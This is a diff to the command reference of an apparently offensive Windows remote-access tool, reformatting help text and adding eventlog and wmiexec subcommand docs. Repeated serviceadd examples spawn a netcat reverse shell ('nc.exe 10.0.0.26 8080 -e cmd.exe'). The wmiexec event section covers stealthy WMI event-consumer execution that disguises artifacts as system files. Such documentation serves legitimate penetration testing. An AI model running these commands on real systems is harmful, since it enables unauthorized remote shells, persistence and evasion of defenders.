@@ -28,7 +28,9 @@ Example Usage: use <sharename> | use C$
 
 **Help:**
 ```
-ls [-h] [-s {name,size,created,lastaccess,lastwrite}] [--sort-reverse] [-l] [-r depth] [-o filename] [--show] [--type {f,d,a}]
+ls [-h] [-s {name,size,created,lastaccess,lastwrite}]
+                  [--sort-reverse] [-l] [-r depth] [-o filename] [--show]
+                  [--type {f,d,a}]
                   [path]
 List contents of a directory at a specified path. File paths with spaces must be entirely in quotes.
 ```
@@ -43,7 +45,7 @@ ls --type f -r 2        # Recursively list only files to depth 2
 
 ### Arguments
 
-- **`path`**: Path to list contents, defaults to current path 
+- **`path`**: Path to list contents, defaults to current path
   - Default: `.`
   - Required: No
 
@@ -58,7 +60,7 @@ ls --type f -r 2        # Recursively list only files to depth 2
 - **`output`**: Save output to file
   - Required: No
 
-- **`type`**: Filter by type: f=files only, d=directories only, a=all 
+- **`type`**: Filter by type: f=files only, d=directories only, a=all
   - Choices: f, d, a
   - Default: `a`
   - Required: No
@@ -71,9 +73,12 @@ ls --type f -r 2        # Recursively list only files to depth 2
 
 **Help:**
 ```
-find [-h] [--path PATH] [--type {f,d,a}] [--size SIZE] [--mtime MTIME] [--ctime CTIME] [--atime ATIME] [--regex] [--iname]
-                    [--maxdepth MAXDEPTH] [--mindepth MINDEPTH] [--limit LIMIT] [--sort {name,size,mtime,ctime,atime}] [--reverse]
-                    [--format {table,list,paths,json}] [-o OUTPUT] [--empty] [--hidden] [--progress] [--timeout TIMEOUT]
+find [-h] [--path PATH] [--type {f,d,a}] [--size SIZE]
+                    [--mtime MTIME] [--ctime CTIME] [--atime ATIME] [--regex]
+                    [--iname] [--maxdepth MAXDEPTH] [--mindepth MINDEPTH]
+                    [--limit LIMIT] [--sort {name,size,mtime,ctime,atime}]
+                    [--reverse] [--format {table,list,paths,json}] [-o OUTPUT]
+                    [--empty] [--hidden] [--progress] [--timeout TIMEOUT]
                     pattern
 Search for files and directories across the remote share with advanced filtering options.
 ```
@@ -92,7 +97,7 @@ Example Usage: find "*.txt" -path /Users -type f -size +1MB
   - Default: `.`
   - Required: No
 
-- **`type`**: Search type: f=files only, d=directories only, a=all 
+- **`type`**: Search type: f=files only, d=directories only, a=all
   - Choices: f, d, a
   - Default: `a`
   - Required: No
@@ -109,23 +114,23 @@ Example Usage: find "*.txt" -path /Users -type f -size +1MB
 - **`atime`**: Accessed within N days (positive number)
   - Required: No
 
-- **`maxdepth`**: Maximum search depth 
+- **`maxdepth`**: Maximum search depth
   - Default: `2`
   - Required: No
 
-- **`mindepth`**: Minimum search depth 
+- **`mindepth`**: Minimum search depth
   - Default: `0`
   - Required: No
 
 - **`limit`**: Maximum number of results to return
   - Required: No
 
-- **`sort`**: Sort results by field 
+- **`sort`**: Sort results by field
   - Choices: name, size, mtime, ctime, atime
   - Default: `name`
   - Required: No
 
-- **`format`**: Output format 
+- **`format`**: Output format
   - Choices: table, list, paths, json
   - Default: `table`
   - Required: No
@@ -133,7 +138,7 @@ Example Usage: find "*.txt" -path /Users -type f -size +1MB
 - **`output`**: Save results to file
   - Required: No
 
-- **`timeout`**: Search timeout in seconds 
+- **`timeout`**: Search timeout in seconds
   - Default: `120`
   - Required: No
 
@@ -179,7 +184,8 @@ Example Usage: shares
 
 **Help:**
 ```
-enumpipes [-h] [--detailed] [--method {smb,rpc,hybrid}] [--output filename]
+enumpipes [-h] [--detailed] [--method {smb,rpc,hybrid}]
+                         [--output filename]
 Enumerate named pipes on the remote server via IPC$ share and RPC endpoints. Preserves current share connection by default.
 ```
 
@@ -190,7 +196,7 @@ Example Usage: enumpipes --detailed --output pipes.txt
 
 ### Arguments
 
-- **`method`**: Enumeration method to use 
+- **`method`**: Enumeration method to use
   - Choices: smb, rpc, hybrid
   - Default: `hybrid`
   - Required: No
@@ -239,7 +245,7 @@ Example Usage: cd /path/to/directory
 
 ### Arguments
 
-- **`path`**: Directory path to change to, defaults to current directory 
+- **`path`**: Directory path to change to, defaults to current directory
   - Default: `.`
   - Required: No
 
@@ -1057,7 +1063,8 @@ Example Usage: servicedelete -i 123  OR svcdelete Spooler
 
 **Help:**
 ```
-serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME -s {auto,demand,system}
+serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
+                          -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1077,7 +1084,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 - **`display_name`**: Specify the display name of the new service
   - Required: Yes
 
-- **`start_type`**: Specify the start type of the new service 
+- **`start_type`**: Specify the start type of the new service
   - Choices: auto, demand, system
   - Default: `demand`
   - Required: Yes
@@ -1090,7 +1097,8 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME -s {auto,demand,system}
+serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
+                          -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1110,7 +1118,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 - **`display_name`**: Specify the display name of the new service
   - Required: Yes
 
-- **`start_type`**: Specify the start type of the new service 
+- **`start_type`**: Specify the start type of the new service
   - Choices: auto, demand, system
   - Default: `demand`
   - Required: Yes
@@ -1123,7 +1131,8 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME -s {auto,demand,system}
+serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
+                          -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1143,7 +1152,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 - **`display_name`**: Specify the display name of the new service
   - Required: Yes
 
-- **`start_type`**: Specify the start type of the new service 
+- **`start_type`**: Specify the start type of the new service
   - Choices: auto, demand, system
   - Default: `demand`
   - Required: Yes
@@ -1156,7 +1165,8 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME -s {auto,demand,system}
+serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
+                          -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1176,7 +1186,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 - **`display_name`**: Specify the display name of the new service
   - Required: Yes
 
-- **`start_type`**: Specify the start type of the new service 
+- **`start_type`**: Specify the start type of the new service
   - Choices: auto, demand, system
   - Default: `demand`
   - Required: Yes
@@ -1330,7 +1340,8 @@ Example Usage: tasksshow -i 123
 
 **Help:**
 ```
-taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]
+taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
+                          [-i INTERVAL] [-d DATE]
 Create a new scheduled task on the remote server
 ```
 
@@ -1368,7 +1379,8 @@ Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' 
 
 **Help:**
 ```
-taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]
+taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
+                          [-i INTERVAL] [-d DATE]
 Create a new scheduled task on the remote server
 ```
 
@@ -1626,7 +1638,8 @@ Example Usage: upload /local/path /remote/path
 
 **Help:**
 ```
-download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE] remote_path [local_path]
+download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
+                        remote_path [local_path]
 Download a file from the remote server. File paths with spaces must be entirely in quotes.
 ```
 
@@ -1643,7 +1656,7 @@ Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
 - **`local_path`**: Specify the local file path to download to, optional
   - Required: No
 
-- **`chunk_size`**: Chunk size for download (e.g., 64k, 1M, 512k) 
+- **`chunk_size`**: Chunk size for download (e.g., 64k, 1M, 512k)
   - Default: `64k`
   - Required: No
 
@@ -1655,7 +1668,8 @@ Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
 
 **Help:**
 ```
-download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE] remote_path [local_path]
+download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
+                        remote_path [local_path]
 Download a file from the remote server. File paths with spaces must be entirely in quotes.
 ```
 
@@ -1672,7 +1686,7 @@ Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
 - **`local_path`**: Specify the local file path to download to, optional
   - Required: No
 
-- **`chunk_size`**: Chunk size for download (e.g., 64k, 1M, 512k) 
+- **`chunk_size`**: Chunk size for download (e.g., 64k, 1M, 512k)
   - Default: `64k`
   - Required: No
 
@@ -1704,7 +1718,7 @@ Example Usage: mget /remote/path /local/path
 - **`p`**: Specify a regex pattern to match filenames
   - Required: No
 
-- **`d`**: Specify folder depth count for recursion 
+- **`d`**: Specify folder depth count for recursion
   - Default: `2`
   - Required: No
 
@@ -1931,7 +1945,7 @@ Example Usage: regset -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
 - **`data`**: Specify the registry data to set
   - Required: Yes
 
-- **`type`**: Specify the registry type to set 
+- **`type`**: Specify the registry type to set
   - Default: `REG_SZ`
   - Required: No
 
@@ -2331,7 +2345,7 @@ Example Usage: counter -c 123 [-a x86]
 - **`counter`**: Specify the counter to display
   - Required: No
 
-- **`arch`**: Specify the architecture of the remote server 
+- **`arch`**: Specify the architecture of the remote server
   - Choices: x86, x64, unk
   - Default: `unk`
   - Required: No
@@ -2361,7 +2375,8 @@ Example Usage: network
 
 **Help:**
 ```
-atexec [-h] -c COMMAND --sp SP [--sn SN] [--tn TN] [--ta TA] [--td TD] [--tf TF] [--sh SH] [--shell] [-w WAIT]
+atexec [-h] -c COMMAND --sp SP [--sn SN] [--tn TN] [--ta TA]
+                      [--td TD] [--tf TF] [--sh SH] [-i] [-w WAIT]
 Execute a command on the remote server
 ```
 
@@ -2376,7 +2391,7 @@ For multi-word commands: atexec -c "echo hello world" -tn MyTask
 - **`command`**: Specify the command to execute. For commands with spaces, wrap in quotes (e.g., 'echo hello world')
   - Required: Yes
 
-- **`sp`**: Specify the folder to save the output file 
+- **`sp`**: Specify the folder to save the output file
   - Default: `\Users\Public\Downloads\`
   - Required: Yes
 
@@ -2386,23 +2401,23 @@ For multi-word commands: atexec -c "echo hello world" -tn MyTask
 - **`tn`**: Specify the name of the scheduled task (default: auto-generated)
   - Required: No
 
-- **`ta`**: Specify the author of the scheduled task 
+- **`ta`**: Specify the author of the scheduled task
   - Default: `Slinger`
   - Required: No
 
-- **`td`**: Specify the description of the scheduled task 
+- **`td`**: Specify the description of the scheduled task
   - Default: `Scheduled task created by Slinger`
   - Required: No
 
-- **`tf`**: Specify the folder to run the task in 
+- **`tf`**: Specify the folder to run the task in
   - Default: `\Windows`
   - Required: No
 
-- **`sh`**: Specify the share name to connect to 
+- **`sh`**: Specify the share name to connect to
   - Default: `C$`
   - Required: No
 
-- **`wait`**: Seconds to wait for the task to complete 
+- **`wait`**: Seconds to wait for the task to complete
   - Default: `1`
   - Required: No
 
@@ -2457,6 +2472,36 @@ Manage resume download states and cleanup
 Example Usage: downloads list
 ```
 
+### Subcommands
+
+#### `downloads list`
+
+**Description:** Display all active resumable downloads with progress
+
+**Help:**
+```
+downloads list [-h]
+Display all active resumable downloads with progress
+```
+
+---
+
+#### `downloads cleanup`
+
+**Description:** Remove completed, stale, or corrupted download state files
+
+**Help:**
+```
+downloads cleanup [-h] [--max-age MAX_AGE] [--force]
+Remove completed, stale, or corrupted download state files
+```
+
+##### Arguments
+
+- **`max_age`**: Remove state files older than N days
+  - Default: `7`
+  - Required: No
+
 ---
 
 ## `eventlog`
@@ -2477,6 +2522,106 @@ Example Usage:
   eventlog query --log System --level Error --count 50
   eventlog sources --log Application
 ```
+
+### Subcommands
+
+#### `eventlog query`
+
+**Description:** Query Windows Event Log entries via RPC over \pipe\eventlog with filtering
+
+**Help:**
+```
+eventlog query [-h] --log LOG [--id ID]
+                              [--type {error,warning,information,success,failure}]
+                              [--since SINCE] [--last MINUTES] [--limit LIMIT]
+                              [--source SOURCE] [--find FIND]
+                              [--format {table,json,list,csv}] [-o OUTPUT]
+                              [--verbose] [--order {newest,oldest}]
+Query Windows Event Log entries via RPC over \pipe\eventlog with filtering
+```
+
+**Example Usage:**
+```
+Examples:
+  eventlog query --log System --id 1000
+  eventlog query --log Application --level error --last 60
+  eventlog query --log Security --find 'failed logon' --count 20
+```
+
+##### Arguments
+
+- **`log`**: Event log name (System, Application, Security, etc.)
+  - Required: Yes
+
+- **`id`**: Specific event ID to filter
+  - Required: No
+
+- **`level`**: Event level to filter
+  - Choices: error, warning, information, success, failure
+  - Required: No
+
+- **`since`**: Events since date (YYYY-MM-DD or 'YYYY-MM-DD HH:MM:SS')
+  - Required: No
+
+- **`last`**: Events from the last X minutes
+  - Required: No
+
+- **`limit`**: Maximum number of events to return
+  - Default: `1000`
+  - Required: No
+
+- **`source`**: Filter by event source name
+  - Required: No
+
+- **`find`**: Search for string in event content
+  - Required: No
+
+- **`format`**: Output format (default: list)
+  - Choices: table, json, list, csv
+  - Default: `list`
+  - Required: No
+
+- **`output`**: Save output to file
+  - Required: No
+
+- **`order`**: Order events by newest first (default) or oldest first
+  - Choices: newest, oldest
+  - Default: `newest`
+  - Required: No
+
+---
+
+#### `eventlog list`
+
+**Description:** List all available event logs on the remote system via RPC over \pipe\eventlog
+
+**Help:**
+```
+eventlog list [-h]
+List all available event logs on the remote system via RPC over \pipe\eventlog
+```
+
+---
+
+#### `eventlog check`
+
+**Description:** Check if a specific Windows Event Log exists and is accessible
+
+**Help:**
+```
+eventlog check [-h] --log LOG
+Check if a specific Windows Event Log exists and is accessible
+```
+
+**Example Usage:**
+```
+Example Usage: eventlog check --log 'Microsoft-Windows-Sysmon/Operational'
+```
+
+##### Arguments
+
+- **`log`**: Event log name to check (can include custom paths)
+  - Required: Yes
 
 ---
 
@@ -2504,5 +2649,303 @@ Example Usage:
   wmiexec event 'net user' --trigger-delay 5  # Event consumer
 ```
 
+### Subcommands
+
+#### `wmiexec task`
+
+**Description:** Execute commands using Windows Task Scheduler via WMI. Creates, executes, and cleans up scheduled tasks through the root\Microsoft\Windows\TaskScheduler namespace.
+
+**Help:**
+```
+wmiexec task [-h] [--tn TN] [--sp SP] [--sn SN]
+                            [--cleanup-delay CLEANUP_DELAY] [--no-cleanup]
+                            [-i] [--no-output] [--timeout TIMEOUT]
+                            [--output filename] [--working-dir WORKING_DIR]
+                            [--shell {cmd,powershell}] [--raw-command]
+                            [command]
+Execute commands using Windows Task Scheduler via WMI. Creates, executes, and cleans up scheduled tasks through the root\Microsoft\Windows\TaskScheduler namespace.
+```
+
+**Example Usage:**
+```
+Example Usage: wmiexec task "whoami"
+wmiexec task "dir C:\" --tn MyTask --cleanup-delay 5
+wmiexec task --interactive  # Interactive shell
+wmiexec task "ipconfig" --output network.txt
+```
+
+##### Arguments
+
+- **`command`**: Command to execute (not required for --interactive mode)
+  - Required: No
+
+- **`tn`**: Custom scheduled task name (default: auto-generated WMI_Task_XXXXX)
+  - Required: No
+
+- **`sp`**: Directory to save output file
+  - Default: `\Windows\Temp\`
+  - Required: No
+
+- **`sn`**: Name of output file (default: auto-generated wmi_np_output_XXXXX.tmp)
+  - Required: No
+
+- **`cleanup_delay`**: Seconds to wait before task cleanup
+  - Default: `2`
+  - Required: No
+
+- **`timeout`**: Command execution timeout in seconds
+  - Default: `30`
+  - Required: No
+
+- **`output`**: Save command output to local file
+  - Required: No
+
+- **`working_dir`**: Working directory for command execution
+  - Default: `C:\`
+  - Required: No
+
+- **`shell`**: Shell to use for command execution
+  - Choices: cmd, powershell
+  - Default: `cmd`
+  - Required: No
+
 ---
 
+#### `wmiexec dcom`
+
+**Description:** Execute commands using traditional WMI Win32_Process.Create method via DCOM. Requires DCOM connectivity (ports 135 + dynamic range). May be blocked by firewalls.
+
+**Help:**
+```
+wmiexec dcom [-h] [-i] [--working-dir WORKING_DIR]
+                            [--timeout TIMEOUT] [--output filename]
+                            [--no-output] [--sleep-time SLEEP_TIME]
+                            [--save-name SAVE_NAME] [--raw-command]
+                            [--shell {cmd,powershell}]
+                            [command]
+Execute commands using traditional WMI Win32_Process.Create method via DCOM. Requires DCOM connectivity (ports 135 + dynamic range). May be blocked by firewalls.
+```
+
+**Example Usage:**
+```
+Command Wrappers:
+  DEFAULT: cmd.exe /Q /c "command"     # Standard Windows command
+  execution
+  --raw-command: command               # No wrapper, execute directly
+  --shell powershell: powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -NonInteractive -NoLogo -Command "command"
+
+Raw Command Usage:
+  Use --raw-command when you want to execute commands WITHOUT the cmd.exe wrapper:
+
+  Standard (with cmd.exe wrapper):
+    wmiexec dcom "whoami"              # Executes: cmd.exe /Q /c whoami
+    wmiexec dcom "dir C:\"            # Executes: cmd.exe /Q /c dir C:
+  Raw (no wrapper):
+    wmiexec dcom "whoami" --raw-command              # Executes: whoami (directly)
+    wmiexec dcom "calc.exe" --raw-command            # Executes: calc.exe (directly)
+    wmiexec dcom "powershell.exe -Command Get-Process" --raw-command  # Custom PowerShell
+
+Interactive Mode:
+  wmiexec dcom --interactive           # Start interactive DCOM shell
+  wmiexec dcom --interactive --save-name session.txt  # Save session to file
+```
+
+##### Arguments
+
+- **`command`**: Command to execute (not required for --interactive mode)
+  - Required: No
+
+- **`working_dir`**: Working directory for command execution
+  - Default: `C:\`
+  - Required: No
+
+- **`timeout`**: Command execution timeout in seconds
+  - Default: `30`
+  - Required: No
+
+- **`output`**: Save command output to local file
+  - Required: No
+
+- **`sleep_time`**: Sleep time before capturing output in seconds
+  - Default: `1.0`
+  - Required: No
+
+- **`save_name`**: Custom filename for remote output capture (default: auto-generated)
+  - Required: No
+
+- **`shell`**: Shell to use for command execution
+  - Choices: cmd, powershell
+  - Default: `cmd`
+  - Required: No
+
+---
+
+#### `wmiexec event`
+
+**Description:** Execute commands using WMI Event Consumers (highest stealth method).
+
+Examples:
+  # Basic usage
+  wmiexec event "whoami"
+
+  # Raw command mode (direct CommandLineTemplate)
+  wmiexec event "calc.exe" --raw-command                         # ExecutablePath: cmd.exe
+  wmiexec event "whoami" --raw-exec ""                           # ExecutablePath: None (blank)
+  wmiexec event "Get-Process" --raw-exec "powershell.exe"        # ExecutablePath: powershell.exe
+
+  # Custom artifacts for stealth
+  wmiexec event "whoami" --exe pwsh --cname "UpdateConsumer" --fname "MaintenanceFilter" \
+    --script-name "check_system" --upload-path "C:\Windows\System32\check_system.ps1" \
+    -o "C:\Windows\Logs\system_check.log" --trigger-exe "svchost.exe"
+
+  # With local save
+  wmiexec event "systeminfo" -o "C:\temp\info.txt" --save "./sysinfo.txt"
+
+
+**Help:**
+```
+wmiexec event [-h] [--consumer-name CONSUMER_NAME]
+                             [--filter-name FILTER_NAME]
+                             [--trigger-delay TRIGGER_DELAY] [--no-cleanup]
+                             [--timeout TIMEOUT] [--no-output]
+                             [--save filename] [--working-dir WORKING_DIR]
+                             [--shell {cmd,powershell}] [--exe {cmd,pwsh}]
+                             [--trigger-exe TRIGGER_EXE] [-t TRIGGER] [-l]
+                             [-i] [--system] [--upload-path UPLOAD_PATH]
+                             [--script-name SCRIPT_NAME] [-o OUTPUT]
+                             [--raw-command] [--raw-exec RAW_EXEC]
+                             [command]
+Execute commands using WMI Event Consumers (highest stealth method).
+
+Examples:
+  # Basic usage
+  wmiexec event "whoami"
+
+  # Raw command mode (direct CommandLineTemplate)
+  wmiexec event "calc.exe" --raw-command                         # ExecutablePath: cmd.exe
+  wmiexec event "whoami" --raw-exec ""                           # ExecutablePath: None (blank)
+  wmiexec event "Get-Process" --raw-exec "powershell.exe"        # ExecutablePath: powershell.exe
+
+  # Custom artifacts for stealth
+  wmiexec event "whoami" --exe pwsh --cname "UpdateConsumer" --fname "MaintenanceFilter" \
+    --script-name "check_system" --upload-path "C:\Windows\System32\check_system.ps1" \
+    -o "C:\Windows\Logs\system_check.log" --trigger-exe "svchost.exe"
+
+  # With local save
+  wmiexec event "systeminfo" -o "C:\temp\info.txt" --save "./sysinfo.txt"
+
+```
+
+##### Arguments
+
+- **`command`**: Command to execute (not required for --interactive mode)
+  - Required: No
+
+- **`consumer_name`**: Name for CommandLineEventConsumer (default: auto-generated)
+  - Required: No
+
+- **`filter_name`**: Name for __EventFilter (default: auto-generated)
+  - Required: No
+
+- **`trigger_delay`**: Seconds to wait before triggering event
+  - Default: `5`
+  - Required: No
+
+- **`timeout`**: Total execution timeout in seconds
+  - Default: `30`
+  - Required: No
+
+- **`save`**: Save command output to local file
+  - Required: No
+
+- **`working_dir`**: Working directory for command execution
+  - Default: `C:\`
+  - Required: No
+
+- **`shell`**: Shell to use for command execution
+  - Choices: cmd, powershell
+  - Default: `cmd`
+  - Required: No
+
+- **`exe`**: Execution type: 'cmd' (uploads .bat file) or 'pwsh' (uploads .ps1 file)
+  - Choices: cmd, pwsh
+  - Default: `cmd`
+  - Required: No
+
+- **`trigger_exe`**: Executable to trigger the Event Filter (default: notepad.exe). Will be automatically spawned after consumer creation.
+  - Default: `notepad.exe`
+  - Required: No
+
+- **`trigger`**: Only trigger an existing Event Consumer (no creation). Specify executable to spawn.
+  - Required: No
+
+- **`upload_path`**: Custom script upload path on target (default: C:\Windows\Temp\RANDOM_NAME.ext where ext is .bat for cmd or .ps1 for pwsh)
+  - Required: No
+
+- **`script_name`**: Custom script filename (without extension, will be auto-appended based on --exe type). If not specified, completely random name is generated.
+  - Required: No
+
+- **`output`**: Custom remote output file path for capturing command results (default: C:\Windows\Temp\out_RANDOM.tmp). Supports CMS notation.
+  - Required: No
+
+- **`raw_exec`**: Put the entire command directly into CommandLineTemplate. ExecutablePath is set to the provided string value.
+  - Required: No
+
+---
+
+#### `wmiexec query`
+
+**Description:** Execute WMI Query Language (WQL) queries against the remote system. Supports interactive mode, class description, and multiple output formats.
+
+**Help:**
+```
+wmiexec query [-h] [--interactive] [--describe CLASS]
+                             [--list-classes] [--template TEMPLATE]
+                             [--list-templates] [--namespace NAMESPACE]
+                             [--format {list,table,json,csv}] [-o FILE]
+                             [--timeout SECONDS]
+                             [query]
+Execute WMI Query Language (WQL) queries against the remote system. Supports interactive mode, class description, and multiple output formats.
+```
+
+**Example Usage:**
+```
+Query Examples:
+  wmiexec query "SELECT * FROM Win32_Process"
+  wmiexec query "SELECT Name, ProcessId FROM Win32_Process WHERE Name = 'notepad.exe'"
+  wmiexec query "SELECT * FROM Win32_Service WHERE State = 'Running'"
+  wmiexec query --describe Win32_Process
+  wmiexec query --interactive
+  wmiexec query --template processes --timeout 300
+  wmiexec query "SELECT * FROM Win32_UserAccount" --format json -o users.json
+  wmiexec query --template processes --format table
+```
+
+##### Arguments
+
+- **`query`**: WQL query string to execute (e.g., 'SELECT * FROM Win32_Process')
+  - Required: No
+
+- **`describe`**: Describe WMI class schema (e.g., --describe Win32_Process)
+  - Required: No
+
+- **`template`**: Execute predefined query template (use --list-templates to see available)
+  - Required: No
+
+- **`namespace`**: WMI namespace to query (default: root/cimv2)
+  - Default: `root/cimv2`
+  - Required: No
+
+- **`format`**: Output format for query results (default: list)
+  - Choices: list, table, json, csv
+  - Default: `list`
+  - Required: No
+
+- **`output`**: Save query results to file
+  - Required: No
+
+- **`timeout`**: Query timeout in seconds (default: 120)
+  - Default: `120`
+  - Required: No
+
+---
